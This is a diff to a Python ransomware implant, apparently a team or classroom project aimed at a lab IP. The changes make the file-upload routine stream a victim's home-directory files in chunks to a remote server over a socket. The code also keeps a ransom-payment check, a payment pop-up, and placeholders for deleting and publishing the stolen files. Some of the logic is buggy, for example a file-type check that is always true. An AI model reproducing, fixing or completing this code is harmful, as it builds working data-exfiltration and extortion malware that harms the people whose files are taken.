@@ -14,7 +14,7 @@ import math
 class Ransomware: 
     SERVER_IP = "192.168.56.110"
     ENCODING = "utf-8"
-    MAX_SIZE = 1024
+    MAX_SIZE = 4096
 
     def __init__(self, host1, host2, number, directory):
         # Construct hostname of the remote server from the first two
@@ -59,24 +59,37 @@ class Ransomware:
         return self._socket
 
     #TODO Rafi/Yusef:
-    def send_file_to_server(self, file_path, filename):
+    def send_file_to_server(self, file_path, filename, size):
+        print(filename)
+        
+        if ".pdf" or ".jar" in filename:
+            return
             
         """ Opening and reading the file data. """
-        file = open(file_path, "r")
-        data = file.read()
+        file = open(file_path, "r", encoding = "ISO-8859-1")
 
         """ Sending the filename to the server. """
-        self._socket.sendall(base64.b64encode(filename.encode(Ransomware.ENCODING)))
+        self._socket.send(base64.b64encode(filename.encode(Ransomware.ENCODING)))
         msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
         print(f"[SERVER]: {msg}")
 
-        """ Sending the file data to the server. """
-        self._socket.sendall(base64.b64encode(data.encode(Ransomware.ENCODING)))
-        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
-        print(f"[SERVER]: {msg}")
-        
+        while True:
+            data = file.read(1024)
+            print(data)
+            if not data:
+                break
+            """ Sending the file data to the server. """
+            self._socket.sendall(base64.b64encode(data.encode(Ransomware.ENCODING)))
+            msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
+            print(f"[SERVER]: {msg}")
+        print("out")
+        time.sleep(5)
         """ Closing the file. """
         file.close()
+        
+        self._socket.send(base64.b64encode("FILEDONE\n".encode(Ransomware.ENCODING)))
+        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
+        print(f"[SERVER]: {msg}")
 
     #TODO Subin:
     def check_if_user_has_paid(self):
@@ -135,7 +148,7 @@ class Ransomware:
 
 
     # Encrypt all the safe to encrypt files on a victims pc
-    def encrypt_and_send_all_files(self, directory, key):
+    def encrypt_and_send_all_files(self, directory):
 
         number_of_files = 0
         size_of_files = 0
@@ -147,14 +160,14 @@ class Ransomware:
                 file_size = os.path.getsize(file_path)
                 size_of_files += file_size
                 number_of_files += 1
+                
+                print(file_size)
 
                 # Send file to server
-                self.send_file_to_server(file_path, file)
-        
-        self._socket.sendall(base64.b64encode("DONE.".encode(Ransomware.ENCODING)))
-
-        # Encrypt file
-        self.encrypt_file(file_path, key)
+                self.send_file_to_server(file_path, file, str(file_size))
+                # Encrypt file
+                # self.encrypt_file(file_path, key)
+        self._socket.send(base64.b64encode("DONE.".encode(Ransomware.ENCODING)))
 
         print("Number of files encrypted: " + str(number_of_files))
         print("Total size of files: " + str(size_of_files))
@@ -181,33 +194,34 @@ class Ransomware:
         self.establish_connection()
         
         """ Receiving the public key. """
-        filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-        print(f"[RECV] Receiving the public key.")
-        file = open(filename, "w")
-        self._socket.sendall("Public key filename received.".encode("utf-8"))
+        #filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+        #print(f"[RECV] Receiving the public key.")
+        #file = open(filename, "w")
+        #self._socket.sendall("Public key filename received.".encode("utf-8"))
  
         """ Receiving the public key from the server. """
-        data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-        file.write(data)
+        #data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+        #file.write(data)
           
-        print(f"[RECV] Receiving the public key data.")
-        file.write(data)
-        self._socket.sendall("File data received".encode("utf-8"))
+        #print(f"[RECV] Receiving the public key data.")
+        #file.write(data)
+        #self._socket.sendall("File data received".encode("utf-8"))
  
         """ Closing the file. """
-        file.close()
+        #file.close()
 
         #TODO: Replace this with Asymetric crypto
         #Generate key and make a key file
         #generate_key()
         # VICTIM DOESN'T GENERATE THE KEY PAIR! This key file should be sent to them from the server when Implant.py is run
-        with open("key.key", "rb") as key:
-            key = key.read()
+        #with open("key.key", "rb") as key:
+        #    key = key.read()
 
 
         #Encrypt all files
-        # t1 = threading.Thread(target=self.encrypt_and_send_all_files(), args=(self._directory, key))
-        # t1.start()
+        t1 = threading.Thread(target=self.encrypt_and_send_all_files(self._directory))
+        t1.start()
+        print("thread started")
 
 
         #NOTE: Ideally this time would be stored on the server so that if they close their computer and open it 
@@ -241,7 +255,7 @@ class Ransomware:
         #User has paid before the time ran out
         if (ransomware.check_if_user_has_paid()):
             # Waits until all the files has been uploaded before processing the payment
-            #t1.join()
+            t1.join()
             popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
         
             """ Receiving the private key. """
@@ -265,9 +279,9 @@ class Ransomware:
         
             #TODO: Implement code to delete all the files that are stored on the server
 
-            else: # Timer has run out
-                #TODO: Implement file deletion and internet publication code.
-                print('huh')
+        else: # Timer has run out
+            #TODO: Implement file deletion and internet publication code.
+            print('huh')
 
 
 
@@ -280,7 +294,7 @@ if __name__ == '__main__':
     logging.basicConfig(level=logging.DEBUG)
 
     # Initialize dropper application.
-    ransomware = Ransomware('tsoh', 'lacol', 729000000, directory)
+    ransomware = Ransomware('tsoh', 'lacol', 729000000, HOME)
     # Receives public key and begins to send files to the server.
     ransomware.execute_attack()
 
